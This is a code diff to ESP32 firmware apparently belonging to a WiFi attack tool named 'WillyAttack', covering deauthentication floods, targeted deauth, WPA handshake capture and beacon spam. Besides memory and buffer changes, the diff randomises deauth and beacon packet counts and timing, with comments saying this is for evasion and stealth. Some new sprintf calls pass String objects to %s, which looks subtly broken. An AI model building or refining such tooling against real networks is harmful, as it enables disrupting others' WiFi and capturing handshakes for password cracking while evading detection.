@@ -1,4 +1,5 @@
 #include "wifi_atks.h"
+#include "../core/SecurityUtils.h"
 #include "core/display.h"
 #include "core/main_menu.h"
 #include "core/mykeyboard.h"
@@ -22,11 +23,45 @@
 #include <sys/time.h>
 #include <unistd.h>
 
-
 #define WIFI_ATK_NAME "WillyAttack"
 extern bool showHiddenNetworks;
 
-std::vector<wifi_ap_record_t> ap_records;
+// Otimizado: usar PSRAM para reduzir uso de RAM interna
+wifi_ap_record_t *ap_records = nullptr;
+size_t ap_records_capacity = 0;
+size_t ap_records_size = 0;
+
+// Otimizado: funções auxiliares para gerenciamento de buffer PSRAM
+void ap_records_clear() { ap_records_size = 0; }
+
+bool ap_records_push_back(const wifi_ap_record_t &record) {
+  if (ap_records_size >= ap_records_capacity) {
+    // Expandir buffer
+    size_t new_capacity =
+        ap_records_capacity == 0 ? 16 : ap_records_capacity * 2;
+    wifi_ap_record_t *new_buffer = nullptr;
+
+    if (psramFound()) {
+      new_buffer = (wifi_ap_record_t *)heap_caps_realloc(
+          ap_records, new_capacity * sizeof(wifi_ap_record_t),
+          MALLOC_CAP_SPIRAM);
+    } else {
+      new_buffer = (wifi_ap_record_t *)realloc(
+          ap_records, new_capacity * sizeof(wifi_ap_record_t));
+    }
+
+    if (!new_buffer)
+      return false;
+
+    ap_records = new_buffer;
+    ap_records_capacity = new_capacity;
+  }
+
+  ap_records[ap_records_size++] = record;
+  return true;
+}
+
+size_t ap_records_size_func() { return ap_records_size; }
 /**
  * @brief Decomplied function that overrides original one at compilation time.
  *
@@ -102,7 +137,11 @@ static inline void prepareBeaconPacket(uint8_t outPacket[BEACON_PKT_LEN],
   if (ssidLen > 32)
     ssidLen = 32;
   if (ssidLen > 0) {
-    memcpy(&outPacket[38], ssid, ssidLen);
+    if (!BufferProtector::safeMemoryCopy(&outPacket[38], 32, ssid, ssidLen)) {
+      SecurityLogger::log(SecurityLogger::ERROR, "WiFi",
+                          "Falha na cópia segura do SSID");
+      return;
+    }
   }
 
   // set channel and WPA flags
@@ -129,15 +168,17 @@ void nextChannel() {
 
 /***************************************************************************************
 ** Function: send_raw_frame
-** @brief: Broadcasts deauth frames
+** @brief: Broadcasts deauth frames with optimized timing and stealth
 ***************************************************************************************/
 void send_raw_frame(const uint8_t *frame_buffer, int size) {
-  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-  vTaskDelay(1 / portTICK_PERIOD_MS);
-  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-  vTaskDelay(1 / portTICK_PERIOD_MS);
-  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-  vTaskDelay(1 / portTICK_PERIOD_MS);
+  // Otimizado: variar número de pacotes (2-4) e delays aleatórios (1-5ms) para
+  // evasão
+  int num_packets = esp_random() % 3 + 2; // 2 to 4 packets
+  for (int i = 0; i < num_packets; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    int delay_ms = esp_random() % 5 + 1; // 1-5ms random delay
+    vTaskDelay(delay_ms / portTICK_PERIOD_MS);
+  }
 }
 
 /***************************************************************************************
@@ -175,11 +216,14 @@ void wifi_atk_info(String tssid, String mac, uint8_t channel) {
   drawMainBorder();
   tft.setTextColor(willyConfig.priColor);
   tft.drawCentreString("-=Informações=-", tftWidth / 2, 28, SMOOTH_FONT);
-  tft.drawString("AP: " + tssid, 10, 48);
-  tft.drawString("Canal: " + String(channel), 10, 66);
+  char buf[64];
+  sprintf(buf, "AP: %s", tssid);
+  tft.drawString(buf, 10, 48);
+  sprintf(buf, "Canal: %d", channel);
+  tft.drawString(buf, 10, 66);
   tft.drawString(mac, 10, 84);
-  tft.drawString("Pressione " + String(BTN_ALIAS) + " para agir", 10,
-                 tftHeight - 20);
+  sprintf(buf, "Pressione %s para agir", BTN_ALIAS);
+  tft.drawString(buf, 10, tftHeight - 20);
   vTaskDelay(200 / portTICK_PERIOD_MS);
   SelPress = false;
 
@@ -260,9 +304,11 @@ void wifi_atk_menu() {
   if (scanAtks) {
     int nets;
     displayTextLine("Escaneando..");
-    // include hidden networks in the scan depending on toggle
-    nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    ap_records.clear();
+    // include hidden networks in the scan depending on toggle, with timeout for
+    // performance
+    nets = WiFi.scanNetworks(false, showHiddenNetworks, false,
+                             100); // 100ms per channel timeout
+    ap_records_clear();
     options = {};
     for (int i = 0; i < nets; i++) {
       wifi_ap_record_t record;
@@ -284,35 +330,37 @@ void wifi_atk_menu() {
         record.ssid[0] = '\0';
       }
 
-      ap_records.push_back(record);
+      ap_records_push_back(record);
 
-      String ssid = WiFi.SSID(i);
+      char ssid[33];
+      WiFi.SSID(i).toCharArray(ssid, sizeof(ssid));
       int encryptionType = WiFi.encryptionType(i);
       int32_t rssi = WiFi.RSSI(i);
       int32_t ch = WiFi.channel(i);
-      String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
-      String encryptionTypeStr;
+      const char *encryptionPrefix =
+          (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
+      char encryptionTypeStr[15];
       switch (encryptionType) {
       case WIFI_AUTH_OPEN:
-        encryptionTypeStr = "Open";
+        strcpy(encryptionTypeStr, "Open");
         break;
       case WIFI_AUTH_WEP:
-        encryptionTypeStr = "WEP";
+        strcpy(encryptionTypeStr, "WEP");
         break;
       case WIFI_AUTH_WPA_PSK:
-        encryptionTypeStr = "WPA/PSK";
+        strcpy(encryptionTypeStr, "WPA/PSK");
         break;
       case WIFI_AUTH_WPA2_PSK:
-        encryptionTypeStr = "WPA2/PSK";
+        strcpy(encryptionTypeStr, "WPA2/PSK");
         break;
       case WIFI_AUTH_WPA_WPA2_PSK:
-        encryptionTypeStr = "WPA/WPA2/PSK";
+        strcpy(encryptionTypeStr, "WPA/WPA2/PSK");
         break;
       case WIFI_AUTH_WPA2_ENTERPRISE:
-        encryptionTypeStr = "WPA2/Enterprise";
+        strcpy(encryptionTypeStr, "WPA2/Enterprise");
         break;
       default:
-        encryptionTypeStr = "Unknown";
+        strcpy(encryptionTypeStr, "Unknown");
         break;
       }
 
@@ -348,9 +396,11 @@ void deauthFloodAttack() {
   int nets;
 ScanNets:
   displayTextLine("Escaneando..");
-  // include hidden networks in the scan depending on toggle
-  nets = WiFi.scanNetworks(false, showHiddenNetworks);
-  ap_records.clear();
+  // include hidden networks in the scan depending on toggle, with timeout for
+  // performance
+  nets = WiFi.scanNetworks(false, showHiddenNetworks, false,
+                           100); // 100ms per channel timeout
+  ap_records_clear();
   for (int i = 0; i < nets; i++) {
     wifi_ap_record_t record;
     memset(&record, 0, sizeof(record));
@@ -364,7 +414,7 @@ ScanNets:
     } else {
       record.ssid[0] = '\0';
     }
-    ap_records.push_back(record);
+    ap_records_push_back(record);
   }
   // Prepare deauth frame for each AP record
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
@@ -375,7 +425,8 @@ ScanNets:
   uint8_t channel = 0;
   drawMainBorderWithTitle("Deauth Flood");
   while (true) {
-    for (const auto &record : ap_records) {
+    for (size_t i = 0; i < ap_records_size_func(); i++) {
+      const auto &record = ap_records[i];
       channel = record.primary;
       wsl_bypasser_send_raw_frame(
           &record, record.primary); // Sets channel to the same AP
@@ -437,7 +488,7 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
   ap_record.primary = channel;
 
   String encryptionTypeStr = "Unknown";
-  for (size_t i = 0; i < ap_records.size(); i++) {
+  for (size_t i = 0; i < ap_records_size_func(); i++) {
     if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
       switch (ap_records[i].authmode) {
       case WIFI_AUTH_OPEN:
@@ -735,12 +786,16 @@ void target_atk(String tssid, String mac, uint8_t channel) {
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
   wsl_bypasser_send_raw_frame(&ap_record, channel);
 
-  // Attack loop variables
+  // Attack loop variables - Otimizado
   const uint16_t UPDATE_INTERVAL_MS = 2000;
   const uint8_t FRAMES_PER_SEND = 3;
+  const uint32_t MAX_ATTACK_DURATION_MS = 300000; // 5 minutos máximo
+  const uint32_t MIN_FRAME_INTERVAL_US = 10000;   // 10ms mínimo entre frames
 
   uint32_t lastUpdateTime = millis();
+  uint32_t attackStartTime = millis();
   uint32_t frameCount = 0;
+  uint32_t lastFrameTime = micros();
   bool needsRedraw = true;
   bool attackActive = true;
 
@@ -765,9 +820,24 @@ void target_atk(String tssid, String mac, uint8_t channel) {
       needsRedraw = false;
     }
 
+    // Otimizado: Rate limiting para evitar sobrecarga
+    uint32_t currentMicros = micros();
+    if (currentMicros - lastFrameTime < MIN_FRAME_INTERVAL_US) {
+      vTaskDelay(1 / portTICK_PERIOD_MS); // Yield para outras tarefas
+      continue;
+    }
+
+    // Verificar timeout de ataque
+    if (millis() - attackStartTime > MAX_ATTACK_DURATION_MS) {
+      Serial.println("[WiFiAtk] Ataque atingiu timeout máximo");
+      attackActive = false;
+      break;
+    }
+
     // Send deauth frame
     send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
     frameCount += FRAMES_PER_SEND;
+    lastFrameTime = currentMicros;
 
     // Update FPS counter periodically
     uint32_t currentTime = millis();
@@ -919,10 +989,13 @@ void beaconSpamList(const char list[]) {
     prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel,
                         true);
 
-    // send 2 packets instead of 3 (makes devices show more networks)
-    for (int k = 0; k < 2; k++) {
+    // Otimizado: variar número de pacotes (1-3) e delays aleatórios (1-3ms)
+    // para stealth
+    int num_packets = esp_random() % 3 + 1; // 1 to 3 packets
+    for (int k = 0; k < num_packets; k++) {
       esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
-      vTaskDelay(1 / portTICK_PERIOD_MS);
+      int delay_ms = esp_random() % 3 + 1; // 1-3ms random delay
+      vTaskDelay(delay_ms / portTICK_PERIOD_MS);
     }
 
     // move cursor past the SSID and newline
@@ -953,10 +1026,13 @@ void beaconSpamSingle(String baseSSID) {
     prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen,
                         wifi_channel, true);
 
-    // send 2 packets
-    for (int k = 0; k < 2; k++) {
+    // Otimizado: variar número de pacotes (1-3) e delays aleatórios (1-3ms)
+    // para stealth
+    int num_packets = esp_random() % 3 + 1; // 1 to 3 packets
+    for (int k = 0; k < num_packets; k++) {
       esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
-      vTaskDelay(1 / portTICK_PERIOD_MS);
+      int delay_ms = esp_random() % 3 + 1; // 1-3ms random delay
+      vTaskDelay(delay_ms / portTICK_PERIOD_MS);
     }
 
     counter++;
